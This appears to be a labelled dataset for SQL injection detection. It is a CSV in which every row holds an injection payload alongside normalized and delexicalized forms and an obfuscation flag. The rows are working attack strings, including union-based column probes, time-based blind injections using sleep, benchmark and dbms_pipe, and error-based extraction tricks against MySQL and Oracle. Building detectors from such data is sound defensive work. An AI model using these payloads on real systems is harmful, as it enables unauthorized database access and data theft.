payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",1,sqli_dataset.csv,,False,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 'ojkd' = 'ojkd","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( <STR> = 'ojkd"
"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""jhtc"" like ""jhtc",1,sqli_dataset.csv,,True,"1"" ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""jhtc"" like ""jhtc",<NUM><STR>jhtc<STR>jhtc
"1""   )    )    as vbdo where 3882  =  3882",1,sqli_dataset.csv,,False,"1"" ) ) as vbdo where 3882 = 3882","<NUM>"" ) ) as vbdo where <NUM> = <NUM>"
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,sqli_dataset.csv,,False,"1%"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #","<NUM>%"" ) rlike ( select * from ( select ( sleep ( <NUM> ) ) ) vwyq ) #"
-7164%' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ',1,sqli_dataset.csv,,False,-7164%' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and '%' = ',-<NUM>%<STR>%<STR>
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,1,sqli_dataset.csv,,False,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 9069 = 9069,( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and ( <NUM> = <NUM>
"1%""   )    )     )   union all select null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1%"" ) ) ) union all select null,null,null,null,null,null,null--","<NUM>%"" ) ) ) union all select null,null,null,null,null,null,null--"
"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",1,sqli_dataset.csv,,False,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#","-<NUM>' union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1  )   where 2720  =  2720 and elt  (  4249  =  4249,7259  )  --",1,sqli_dataset.csv,,False,"1 ) where 2720 = 2720 and elt ( 4249 = 4249,7259 ) --","<NUM> ) where <NUM> = <NUM> and elt ( <NUM> = <NUM>,<NUM> ) --"
"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",1,sqli_dataset.csv,,False,"-5924' where 5415 = 5415 union all select 5415,5415,5415,5415,5415,5415#","-<NUM>' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',1,sqli_dataset.csv,,False,select 'qqpjq'|| ( select ( case when ( 2933 = 2933 ) then 1 else 0 end ) ) ||'qzvzq',select <STR>|| ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ||<STR>
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",1,sqli_dataset.csv,,False,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""ymss"" = ""ymss","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( <STR> = ""ymss"
"1'+  (  select 'qpxk' where 7139  =  7139 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",1,sqli_dataset.csv,,True,"1'+ ( select 'qpxk' where 7139 = 7139 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) +'",<NUM><STR>qpxk<STR>
"-8538"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,sqli_dataset.csv,,True,"-8538"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )","-<NUM>"" or <NUM> in ( ( char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) )"
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",1,sqli_dataset.csv,,False,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno )","<NUM>"" and ( select * from ( select ( sleep ( <NUM> ) ) ) fzno )"
"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",1,sqli_dataset.csv,,True,"1'+ ( select 'fxhh' where 2571 = 2571 union all select null,null,null,null,null,null,null--","<NUM><STR>fxhh' where <NUM> = <NUM> union all select null,null,null,null,null,null,null--"
"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sqli_dataset.csv,,True,"1%' or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","<NUM>%' or <NUM> = benchmark ( <NUM>,md5 ( 0x544d5a4c ) ) #"
select   (  case when   (  7990  =  7627  )   then 7990 else 1/  (  select 0  )   end  )  --,1,sqli_dataset.csv,,False,select ( case when ( 7990 = 7627 ) then 7990 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --
"-1766""   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""ydzq"" like ""ydzq",1,sqli_dataset.csv,,True,"-1766"" ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""ydzq"" like ""ydzq",-<NUM><STR>ydzq<STR>ydzq
"1%""   )    )    and 1083  =  6202",1,sqli_dataset.csv,,False,"1%"" ) ) and 1083 = 6202","<NUM>%"" ) ) and <NUM> = <NUM>"
"-5731"" union all select 3083,3083,3083#",1,sqli_dataset.csv,,False,"-5731"" union all select 3083,3083,3083#","-<NUM>"" union all select <NUM>,<NUM>,<NUM>#"
"1' in boolean mode  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  #",1,sqli_dataset.csv,,False,"1' in boolean mode ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) #","<NUM>' in boolean mode ) ( select ( case when ( <NUM> = <NUM> ) then regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) else char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) end ) from information_schema.system_users ) #"
"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""%"" = """,<NUM>%<STR>%<STR>
1' where 9816  =  9816 and 7533  =  7533--,1,sqli_dataset.csv,,False,1' where 9816 = 9816 and 7533 = 7533--,<NUM>' where <NUM> = <NUM> and <NUM> = <NUM>--
"1'  )   where 3450  =  3450 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sqli_dataset.csv,,False,"1' ) where 3450 = 3450 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","<NUM>' ) where <NUM> = <NUM> and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
1'  )   and sleep  (  5  )  #,1,sqli_dataset.csv,,False,1' ) and sleep ( 5 ) #,<NUM>' ) and sleep ( <NUM> ) #
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'cbaj'  =  'cbaj,1,sqli_dataset.csv,,False,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'cbaj' = 'cbaj,( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and ( ( <STR> = 'cbaj
"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar",1,sqli_dataset.csv,,False,"-8040"" ) ) ) or make_set ( 3916 = 6787,6787 ) and ( ( ( ""laar"" like ""laar",-<NUM><STR>laar<STR>laar
"-9932"" union all select 4049,4049,4049--",1,sqli_dataset.csv,,False,"-9932"" union all select 4049,4049,4049--","-<NUM>"" union all select <NUM>,<NUM>,<NUM>--"
"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sqli_dataset.csv,,False,"1' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #","<NUM>' ) ) ) or elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #"
"1' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sqli_dataset.csv,,False,"1' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","<NUM>' and <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --"
